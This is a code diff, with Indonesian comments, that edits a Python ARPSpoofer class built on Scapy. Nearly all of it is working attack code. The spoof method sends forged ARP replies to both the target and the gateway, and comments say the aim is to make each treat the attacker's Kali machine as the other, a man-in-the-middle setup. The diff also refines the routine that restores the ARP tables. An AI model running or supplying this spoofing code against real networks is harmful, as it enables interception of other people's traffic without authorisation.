@@ -11,16 +11,23 @@ class ARPSpoofer:
         self.gateway_mac = get_mac(gateway_ip)
         self.is_running = False
 
-    def spoof(self, target_ip, gateway_ip, target_mac):
-        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
+    def spoof(self, target_ip, spoof_ip, target_mac):
+        # op=2 adalah ARP Reply
+        # hwdst ditambahkan agar tidak memicu warning Scapy (Unicast send)
+        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
         scapy.send(packet, verbose=False)
 
     def restore(self):
-        logger.info("Memulihkan tabel ARP target...")
-        packet1 = scapy.ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip, hwsrc=self.gateway_mac)
-        packet2 = scapy.ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, psrc=self.target_ip, hwsrc=self.target_mac)
-        scapy.send(packet1, count=4, verbose=False)
-        scapy.send(packet2, count=4, verbose=False)
+        logger.info(f"Memulihkan tabel ARP: {self.target_ip} & {self.gateway_ip}")
+        # Mengirim paket ARP yang benar (hwsrc asli dipasangkan dengan psrc asli)
+        packet1 = scapy.ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, 
+                          psrc=self.gateway_ip, hwsrc=self.gateway_mac)
+        packet2 = scapy.ARP(op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac, 
+                          psrc=self.target_ip, hwsrc=self.target_mac)
+        
+        # Kirim beberapa kali untuk memastikan target menerimanya
+        scapy.send(packet1, count=5, verbose=False)
+        scapy.send(packet2, count=5, verbose=False)
         logger.info("Tabel ARP berhasil dipulihkan dengan aman.")
 
     def run(self):
@@ -33,8 +40,11 @@ class ARPSpoofer:
         
         try:
             while self.is_running:
+                # Tipu Target: Katakan bahwa Gateway adalah SAYA (Kali)
                 self.spoof(self.target_ip, self.gateway_ip, self.target_mac)
+                # Tipu Gateway: Katakan bahwa Target adalah SAYA (Kali)
                 self.spoof(self.gateway_ip, self.target_ip, self.gateway_mac)
                 time.sleep(2)
         except Exception as e:
             logger.error(f"Error pada modul ARP: {e}")
+            self.is_running = False
